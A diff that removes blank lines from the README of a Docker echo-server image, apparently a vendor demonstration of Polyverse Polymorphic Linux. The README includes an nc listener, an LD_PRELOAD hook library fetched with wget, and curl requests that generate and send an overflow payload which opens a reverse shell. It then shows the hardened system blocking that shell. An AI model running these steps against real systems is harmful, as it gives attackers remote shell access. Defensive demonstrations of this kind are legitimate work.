@@ -7,12 +7,10 @@ Docker node.js echo-server repository.
 # OR
 docker run -d --rm --name echo -p 8080:8080 polyverse/node-echo-server
 ```
-
 ## Stopping
 ```
 docker kill echo
 ```
-
 ## Running interactively (equivalent to automated running described above).
 ```
 docker run -it --rm --name echo -p 8080:8080 polyverse/node-echo-server /bin/sh
@@ -24,7 +22,6 @@ node echo-server.js
 ```
 nc -l 5555
 ```
-
 ## Running interactively w/readhook
 The following commands add and then run with readhook.
 ```
@@ -37,7 +34,6 @@ wget -q -O /tmp/fullhook.so https://github.com/polyverse/readhook/releases/downl
 
 LD_PRELOAD="/tmp/fullhook.so /tmp/basehook.so" node echo-server.js
 ```
-
 ### With the above running container,
 a) Generate a payload (e.g. curl localhost:8080/xyzzxMAKELOAD<ip-address><:port>)
 b) Pass the payload back to confirm that it creates a reverse shell to the listener.
@@ -48,7 +44,6 @@ curl localhost:8080/xyzzxMAKELOADdocker.for.mac.localhost:5555
 curl localhost:8080/xyzzyOVERFLOW<...the rest of the saved output from above.>
 # <Check your listener. It should have a reverse shell to the container.>
 ```
-
 ## Running interactively w/readhook and Polyverse Polymorphic Linux
 ```
 docker run -it --rm --name echo -p 8080:8080 polyverse/node-echo-server /bin/sh
@@ -63,5 +58,4 @@ sed -n -i '/repo.polyverse.io/p' /etc/apk/repositories && apk upgrade --update-c
 
 LD_PRELOAD=/tmp/basehook.so node echo-server.js
 ```
-
 ### Repeat Step b (from above) and confirm that it _does not_ create a reverse shell when Polyverse Polymorphic Linux is installed.
